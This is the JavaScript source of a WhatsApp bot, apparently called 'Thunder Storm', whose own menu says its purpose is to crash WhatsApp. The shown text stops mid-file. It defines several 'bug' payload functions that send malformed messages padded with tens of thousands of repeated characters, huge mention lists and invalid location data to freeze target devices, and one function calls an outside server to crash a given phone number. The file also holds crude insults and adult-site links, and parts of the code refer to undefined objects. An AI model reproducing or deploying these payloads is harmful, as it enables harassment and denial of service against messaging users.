//THUNDER NO ENC

//CLEAR CONSOLE
console.clear();

//END
//SCANING CONTROL

require('./database/settings')
//END
//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const jimp = require("jimp")
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('./database/pusat/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')

//END
//MODULE MESSAGE + PREFIX

module.exports = sock = async (sock, m, chatUpdate, store) => {
    try {
      var body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./database/pusat/Data1')



//END
//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./account/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./account/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await sock.decodeJid(sock.user.id)
const DevOnly = [BotNum, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const cheerio = require('cheerio');
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃MAGHRIB AMA ISYA UDAH LU LAKUIN BELUM"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄ASHAR WOI ASHAR"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️BANGUN TAI UDAH DHUZHUR"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️BANGUN PUKI"
} else {
    ucapanWaktu = "HAI MANUSIA HARAM"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const THM = "https://files.catbox.moe/1f1q6r.jpg"
const Xxx = "https://files.catbox.moe/1f1q6r.jpg"
const ryclol = fs.readFileSync('./image/v3.jpeg')
const babi = fs.readFileSync('./image/v3.jpeg')
const babi2 = fs.readFileSync('./image/v3.jpeg')

//END
//DATA TIKTOK SCRAPER

const { tiktok } = require('./database/pusat/Data5')

//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('./database/pusat/Data2')
//END

//DATA ADDBOT / JADIBOT PAIRING
const {
	jadibot,
	stopbot,
	listjadibot
} = require('./database/jadibot')
//END

//SEETINGS STATUS BOT
if (!sock.public) {
if (!DevOnly) return
}

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END
//AUTO RECORDING

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//sock.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

//END
//FUNCTION CRASH SYSTEM
async function FcUi(jid) {
let veroForceX = JSON.stringify({
status: true,
criador: "veroForceX",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
const contextInfo = {
mentionedJid: [jid],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: jid
}
};

let messagePayload = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo,
body: {
text: "𝐙𝐘𝐍𝐙𝐙 𝐊𝐎𝐊 𝐃𝐈𝐋𝐀𝐖𝐀𝐍",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: veroForceX + "𝐊𝐄𝐍𝐀𝐋 𝐙𝐘𝐍𝐙𝐙 𝐆𝐀? ",},
{ name: "call_permission_request", buttonParamsJson: veroForceX + "\u0003",},
{ name: "mpm", buttonParamsJson: veroForceX + "𝐔𝐈-𝐒𝐘𝐒𝐓𝐄𝐌🐉",},
]
}
}
}
}
};
//FUNC FC NO CLICK
		async function InVisiLoc(X, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "𝐁𝐑 𝐁𝐑 𝐏𝐀𝐓𝐀𝐏𝐈𝐌̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ܜ͙͙͙͙̽̽̽̽̽̽̽̽̽̽ᝄ͢".repeat(50000),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "Tralalalelotralalla",
										"address": "Ampun Devv",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: "TUNG TUNG TUNG SAHUR",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "Cyber Pakmen",
												"sections": [{
													"title": " always zynzz",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);
			await vipbug.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("Send Bug By zynzz anomali"));
		};

		async function InVisiLocNull(X, Qtd, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "ampun suhṳ‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ꦾ".repeat(77777),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "hello beb muach",
										"address": "thunder kill yu",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: "𝐃𝐎𝐗 𝐓𝐇𝐄 𝐀𝐋𝐏𝐇𝐀 𝐗𝐈𝐈𝐗𝐈𝐗𝐈",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "inpiniti cres",
												"sections": [{
													"title": "zynzz nih bos senggol",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);
			await vipbug.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("Send Bug By Zynzz Dev abal abal😘👊"));
		};
//FUNC TERBARU
async function TagWhatsApp1(target, Ptcp = false) {
    const mentionedJid = [
        "0@s.whatsapp.net", 
        ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];

    const contextInfo = {
        mentionedJid, stanzaId: "1234567890ABCDEF", participant: "0@s.whatsapp.net",
        quotedMessage: { callLogMesssage: { isVideo: true, callOutcome: "1", durationSecs: "0", callType: "REGULAR",
            participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }] } },
        remoteJid: target, forwardingScore: 9999999, isForwarded: true,
        externalAdReply: { title: "", body: "", mediaType: "VIDEO", renderLargerThumbnail: true,
            thumbnail: "https://img100.pixhost.to/images/155/533950625_skyzopedia.jpg", sourceUrl: "https://www.instagram.com/WhatsApp" }
    };

    await vipbug.relayMessage(target, { 
        extendedTextMessage: { 
            text: "i have crush on you❤" + "@0".repeat(90000), 
            contextInfo 
        } 
    }, Ptcp ? { participant: { jid: target } } : {});
}	
    async function LocatiOn(target, kuwoted) {
let virtex = "ꦾ".repeat(77777) + "@1".repeat(77777);
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": virtex,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     },
     body: {
     text: "kenal zynzz?"
     },
     nativeFlowMessage: {},
     contextInfo: {
     mentionedJid: ["6285198622453@s.whatsapp.net"],
     groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: virtex }]
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await vipbug.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
console.log(chalk.red.bold('Crash System Device By ManzMods'))
}
async function LocInvisi(target, Ptcp = true) {
				let manzxs = "kenal zynzz?"
			let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "\u0000" +  "ꦾ".repeat(90000),
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: manzxs
							},
							nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(2000), 
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: target,
				quoted: null // BISA LU UBAH JADI QUOTED LAIN
			});

			await vipbug.relayMessage(target, etc.message, Ptcp ? {
				participant: {
					jid: target
				}
			} : {});
			console.log(chalk.white("hi im zynzz"));
		};
    	async function sendCrash(X) {
			try {
				const newcrash = await fetchJson('http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + X);
				console.log(chalk.red("p"));
				console.log(chalk.red("Invisible"));
			} catch (error) {
				console.error("Error Fetching Crash:", error);
			}
		}
		const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const VisiXLoc = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐌𝐚𝐧𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐌 𝐀 𝐍 𝐙 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}
// Generate the WA message based on the content
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject(messageContent), {
    userJid: m.chat, 
    quoted: QuotedGalaxy // Ensure this is defined or passed correctly
});

// Send the generated message
 sock.relayMessage(m.chat, etc.message, {
    participant: { jid: m.chat }, 
    messageId: etc.key.id
});
}
//END
//REPLY MESSAGE
const ReplyImage = (teks) => {
    return sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐈͢𝐦͞𝐩𝐫̲́𝐨̋𝐯͟𝐞ͯ𝐕𝟗̅𝐩𝐫̬̏𝐨`,
                body: `RapipppModss`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: ThumbUrl,
                sourceUrl: `https://youtube.com/`
            }
        }
    }, { quoted: m });
}

//END
//STIKER AND BRAT FUNCTION

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, sock, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await sock.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `𝐈͢𝐦͞𝐩𝐫̲́𝐨̋𝐯͟𝐞ͯ𝐕𝟗̅𝐩𝐫̬̏𝐨`,
                    body: `RapipppModss`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://youtube.com/@stokrapip`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        ReplyRap('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

async function listbut2(chat, teks, listnye, Zets) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363369514105242@newsletter",
newsletterName: `RapipNoCounter!!`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© RapipppModsss`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: { url: './test.jpeg' } }, { upload: sock.waUploadToServer })),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: Zets})
await sock.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "",
      status: "INQUIRY",
      surface: "",
      message: `𝗧𝗵𝗲𝗗𝗲𝘃𝗶𝗹𝗖𝗼𝘃𝗲𝗿𝗲𝗱𝗜𝗻𝗕𝗹𝗼𝗼𝗱`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const lol2 = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
//END

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

let limitUser = PremOnly ? 1 : global.limitCount
async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'menu': {
let limitnya = useLimit
let Menu = `
> ⓘ Rxhl Invictuz
─ 「 𒈔 」Ciao, Sono Uno Script WhatsApp il Cui Scopo è Far Crashare WhatsApp. 
⬡═―—⊱ ⎧ !! 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 !! ⎭ ⊰―—═⬡
✧ Script Name : Rxhl Invictuz 
✧ Version : 1.0.0 Vvip
✧ Author : t.me/dvinzii
✧ Language : JavaScript
✧ Prefix : .

✧ 𝗦𝗘𝗟𝗘𝗖𝗧 𝗕𝗨𝗧𝗧𝗢𝗡 𝗠𝗘𝗡𝗨 ✧
` 
sock.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/1f1q6r.jpg" }, //gif nya
        caption: Menu,
        footer: "© NotMeWizz",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `Rxhl Invictuz`,
                body: `® NotMeWizz`,
                thumbnailUrl: "https://files.catbox.moe/1f1q6r.jpg",
                sourceUrl: "www.pornhub.com",
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
  {
    buttonId: ".bugmenu", 
    buttonText: { 
      displayText: '✧ Trash' 
    }
  }, {
    buttonId: ".funmenu", 
    buttonText: {
      displayText: "✧ Fun"
    }
   }, {
   buttonId: ".owner", 
    buttonText: {
      displayText: "✧ Owner"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: lol })
}
break
case 'buttonbug': {
let limitnya = useLimit
let Menu = `
 *\`[ ThunderStorm V1 ]\`*
 *Version* : Version1!✰
 *Developer* : ZynzzDev✰
 *Name* : ThunderStorm✰

 Example x-crash 628xx
 for button bugs
` 
sock.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/1f1q6r.jpg" }, //gif nya
        caption: Menu,
        footer: "© NotMeWizz - 2025",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `Rxhl Invictuz`,
                body: `® NotMeWizz`,
                thumbnailUrl: "https://files.catbox.moe/1f1q6r.jpg",
                sourceUrl: "www.pornhub.com",
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
  {
   buttonId: ".bugmenu", 
    buttonText: {
      displayText: "✧ Back !!"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: lol })
}
break
case 'bugmenu': {
let limitnya = useLimit
let Menu = `
 *\`[ Thunder Storm ]\`*
 \`✯\` : Thunder Storm V1!✰
 \`✯\` : Zynzz◇
 \`✯\` : Thunder Storm
  [ *\`ZynzzBs\`* ]
` 
sock.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/1f1q6r.jpg" }, //gif nya
        caption: Menu,
        footer: "  [ 𝐈𝐧𝐬𝐭𝐚𝐧𝐭 𝐊𝐢𝐥𝐥 ]\n.six-night\n.crash\n.night\n.call-crash\n\n  [ 𝐊𝐢𝐥𝐥𝐢𝐧𝐠 𝐒𝐮𝐩𝐞𝐫 ]\n.bug-calls\n.instant-time\n.thunder\n.deidara\n.crash-storm\n.mid-night\n\n  [ 𝐁𝐮𝐠 𝐆𝐫𝐨𝐮𝐩 ]\n.blaka-group\n.crash-group\n.valhalla-group\n.floid-gb\n\n[ 𝐖𝐚𝐫𝐧𝐢𝐧𝐠⚠️ ]\n.zynzz-crash\n.mantra-crash\n.extreme-bug\n.goto-war\n.mati-kau\n.delicous\n\n[ 𝐁𝐔𝐆 𝐈𝐏 + 𝐀𝐍𝐃𝐑𝐎 ]\n.isdark\n.yokuzodenoiterama\n.fitoridaratee\n.\n [ 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 ]\n.crash-target \n.night-vision\n.kurama\n.hysitorume\n\n ® 𝐙𝐲𝐧𝐳𝐳 - 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝟐𝟎𝟐𝟓",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `ThunderStormV1`,
                body: `® ZynzzDev`,
                thumbnailUrl: "https://files.catbox.moe/1f1q6r.jpg",
                sourceUrl: "www.pornhub.com",
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
       {
    buttonId: ".menu", 
    buttonText: { 
      displayText: '✧ Back - Menu !!' 
    }
  }, {
    buttonId: ".buttonmenu", 
    buttonText: {
      displayText: "✧ Menu Button"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: lol })
}
break

case 'funmenu': {
let limitnya = useLimit
let Menu = `
> ⓘ Rxhl Invictuz
─ 「 𒈔 」Ciao, Sono Uno Script WhatsApp il Cui Scopo è Far Crashare WhatsApp. 
⬡═―—⊱ ⎧ !! 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 !! ⎭ ⊰―—═⬡
✧ Script Name : Rxhl Invictuz 
✧ Version : 1.0.0 Vvip
✧ Author : t.me/dvinzii
✧ Language : JavaScript
✧ Prefix : .
  
  [ FUN MENU ]
 ✯ brat ( teks nya )
 ✯ hidetag
 ✯ kick 
 ✯ linkgroup
 ✯ resetlinkgc
 ✯ ocr
 [ DOWNLOAD MENU ]
 ✯ tiktok *link*
 ✯ tourl *photo/vid*
 ✯ rvo ( read to view )
` 
sock.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/1f1q6r.jpg" }, //gif nya
        caption: Menu,
        footer: "© ZynzzDev",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `Thunder Storm`,
                body: `® ZynzzDev`,
                thumbnailUrl: "https://files.catbox.moe/1f1q6r.jpg",
                sourceUrl: "www.pornhub.com",
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
     {
    buttonId: ".menu", 
    buttonText: { 
      displayText: '𝐁𝐚𝐜𝐤' 
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "𝐃𝐞𝐯"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: lol })
}
break


/** WhiteList **/
    

case 'owner': {
let name = m.pushName || sock.getName(m.sender);
let pan = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> Thunder Storm Version 1
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`;
